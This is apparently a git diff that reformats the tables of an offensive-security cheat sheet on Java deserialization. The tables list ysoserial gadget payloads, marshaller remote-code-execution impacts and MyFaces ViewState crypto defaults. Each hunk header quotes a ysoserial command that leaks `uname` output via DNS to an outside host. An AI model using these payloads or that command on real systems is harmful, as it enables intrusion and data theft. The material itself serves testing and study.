@@ -37,42 +37,42 @@ java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | b
 
 **List of payloads included in ysoserial:**
 
-| Payload             | Authors                                | Dependencies |
-| ------------------- | -------------------------------------- | --- |
-| AspectJWeaver       | @Jang                                  | aspectjweaver:1.9.2, commons-collections:3.2.2 |
-| BeanShell1          | @pwntester, @cschneider4711            | bsh:2.0b5 |
-| C3P0                | @mbechler                              | c3p0:0.9.5.2, mchange-commons-java:0.2.11 |
-| Click1              | @artsploit                             | click-nodeps:2.3.0, javax.servlet-api:3.1.0 |
-| Clojure             | @JackOfMostTrades                      | clojure:1.8.0 |
-| CommonsBeanutils1   | @frohoff                               | commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 |
-| CommonsCollections1 | @frohoff                               | commons-collections:3.1 |
-| CommonsCollections2 | @frohoff                               | commons-collections4:4.0 |
-| CommonsCollections3 | @frohoff                               | commons-collections:3.1 |
-| CommonsCollections4 | @frohoff                               | commons-collections4:4.0 |
-| CommonsCollections5 | @matthias_kaiser, @jasinner            | commons-collections:3.1  |
-| CommonsCollections6 | @matthias_kaiser                       | commons-collections:3.1  |
-| CommonsCollections7 | @scristalli, @hanyrax, @EdoardoVignati | commons-collections:3.1  |
-| FileUpload1         | @mbechler                              | commons-fileupload:1.3.1, commons-io:2.4|
-| Groovy1             | @frohoff                               | groovy:2.3.9            |
-| Hibernate1          | @mbechler                              | |
-| Hibernate2          | @mbechler                              | |
-| JBossInterceptors1  | @matthias_kaiser                       | javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |
-| JRMPClient          | @mbechler                              | |
-| JRMPListener        | @mbechler                              | |
+| Payload             | Authors                                | Dependencies                                                                                                                                                                                         |
+| ------------------- | -------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| AspectJWeaver       | @Jang                                  | aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                       |
+| BeanShell1          | @pwntester, @cschneider4711            | bsh:2.0b5                                                                                                                                                                                            |
+| C3P0                | @mbechler                              | c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                                            |
+| Click1              | @artsploit                             | click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                                          |
+| Clojure             | @JackOfMostTrades                      | clojure:1.8.0                                                                                                                                                                                        |
+| CommonsBeanutils1   | @frohoff                               | commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                                |
+| CommonsCollections1 | @frohoff                               | commons-collections:3.1                                                                                                                                                                              |
+| CommonsCollections2 | @frohoff                               | commons-collections4:4.0                                                                                                                                                                             |
+| CommonsCollections3 | @frohoff                               | commons-collections:3.1                                                                                                                                                                              |
+| CommonsCollections4 | @frohoff                               | commons-collections4:4.0                                                                                                                                                                             |
+| CommonsCollections5 | @matthias_kaiser, @jasinner            | commons-collections:3.1                                                                                                                                                                              |
+| CommonsCollections6 | @matthias_kaiser                       | commons-collections:3.1                                                                                                                                                                              |
+| CommonsCollections7 | @scristalli, @hanyrax, @EdoardoVignati | commons-collections:3.1                                                                                                                                                                              |
+| FileUpload1         | @mbechler                              | commons-fileupload:1.3.1, commons-io:2.4                                                                                                                                                             |
+| Groovy1             | @frohoff                               | groovy:2.3.9                                                                                                                                                                                         |
+| Hibernate1          | @mbechler                              |                                                                                                                                                                                                      |
+| Hibernate2          | @mbechler                              |                                                                                                                                                                                                      |
+| JBossInterceptors1  | @matthias_kaiser                       | javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                             |
+| JRMPClient          | @mbechler                              |                                                                                                                                                                                                      |
+| JRMPListener        | @mbechler                              |                                                                                                                                                                                                      |
 | JSON1               | @mbechler                              | json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1 |
-| JavassistWeld1      | @matthias_kaiser                       | javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |
-| Jdk7u21             | @frohoff                               | |
-| Jython1             | @pwntester, @cschneider4711            | jython-standalone:2.5.2 |
-| MozillaRhino1       | @matthias_kaiser                       | js:1.7R2 |
-| MozillaRhino2       | @_tint0                                | js:1.7R2 |
-| Myfaces1            | @mbechler                              | |
-| Myfaces2            | @mbechler                              | |
-| ROME                | @mbechler                              | rome:1.0 |
-| Spring1             | @frohoff                               | spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE |
-| Spring2             | @mbechler                              | spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2 |
-| URLDNS              | @gebl                                  | |
-| Vaadin1             | @kai_ullrich                           | vaadin-server:7.7.14, vaadin-shared:7.7.14 |
-| Wicket1             | @jacob-baines                          | wicket-util:6.23.0, slf4j-api:1.6.4 |
+| JavassistWeld1      | @matthias_kaiser                       | javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                                         |
+| Jdk7u21             | @frohoff                               |                                                                                                                                                                                                      |
+| Jython1             | @pwntester, @cschneider4711            | jython-standalone:2.5.2                                                                                                                                                                              |
+| MozillaRhino1       | @matthias_kaiser                       | js:1.7R2                                                                                                                                                                                             |
+| MozillaRhino2       | @_tint0                                | js:1.7R2                                                                                                                                                                                             |
+| Myfaces1            | @mbechler                              |                                                                                                                                                                                                      |
+| Myfaces2            | @mbechler                              |                                                                                                                                                                                                      |
+| ROME                | @mbechler                              | rome:1.0                                                                                                                                                                                             |
+| Spring1             | @frohoff                               | spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                                                |
+| Spring2             | @mbechler                              | spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                                            |
+| URLDNS              | @gebl                                  |                                                                                                                                                                                                      |
+| Vaadin1             | @kai_ullrich                           | vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                                           |
+| Wicket1             | @jacob-baines                          | wicket-util:6.23.0, slf4j-api:1.6.4                                                                                                                                                                  |
 
 ### Burp extensions
 
@@ -114,21 +114,21 @@ java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | b
 
 Payload generators for the following marshallers are included:
 
-| Marshaller                      | Gadget Impact                                |
-| ------------------------------- | ---------------------------------------------- |
-| BlazeDSAMF(0&#124;3&#124;X)     | JDK only escalation to Java serialization various third party libraries RCEs |
-| Hessian&#124;Burlap             | various third party RCEs |
-| Castor                          | dependency library RCE |
-| Jackson                         | **possible JDK only RCE**, various third party RCEs |
-| Java                            | yet another third party RCE |
-| JsonIO                          | **JDK only RCE** |
-| JYAML                           | **JDK only RCE** |
-| Kryo                            | third party RCEs |
-| KryoAltStrategy                 | **JDK only RCE** |
-| Red5AMF(0&#124;3)               | **JDK only RCE** |
-| SnakeYAML                       | **JDK only RCEs** |
-| XStream                         | **JDK only RCEs** |
-| YAMLBeans                       | third party RCE |
+| Marshaller                  | Gadget Impact                                                                |
+| --------------------------- | ---------------------------------------------------------------------------- |
+| BlazeDSAMF(0&#124;3&#124;X) | JDK only escalation to Java serialization various third party libraries RCEs |
+| Hessian&#124;Burlap         | various third party RCEs                                                     |
+| Castor                      | dependency library RCE                                                       |
+| Jackson                     | **possible JDK only RCE**, various third party RCEs                          |
+| Java                        | yet another third party RCE                                                  |
+| JsonIO                      | **JDK only RCE**                                                             |
+| JYAML                       | **JDK only RCE**                                                             |
+| Kryo                        | third party RCEs                                                             |
+| KryoAltStrategy             | **JDK only RCE**                                                             |
+| Red5AMF(0&#124;3)           | **JDK only RCE**                                                             |
+| SnakeYAML                   | **JDK only RCEs**                                                            |
+| XStream                     | **JDK only RCEs**                                                            |
+| YAMLBeans                   | third party RCE                                                              |
 
 ## JSON Deserialization
 
@@ -268,9 +268,9 @@ The storage method can also be inferred from the viewstate representation in the
 
 By default MyFaces uses DES as encryption algorithm and HMAC-SHA1 to authenticate the ViewState. It is possible and recommended to configure more recent algorithms like AES and HMAC-SHA256.
 
-| Encryption Algorithm | HMAC        |
-| -------------------- | ----------- |
-| DES ECB (default)    | HMAC-SHA1   |
+| Encryption Algorithm | HMAC      |
+| -------------------- | --------- |
+| DES ECB (default)    | HMAC-SHA1 |
 
 Supported encryption methods are BlowFish, 3DES, AES and are defined by a context parameter.
 The value of these parameters and their secrets can be found inside these XML clauses.
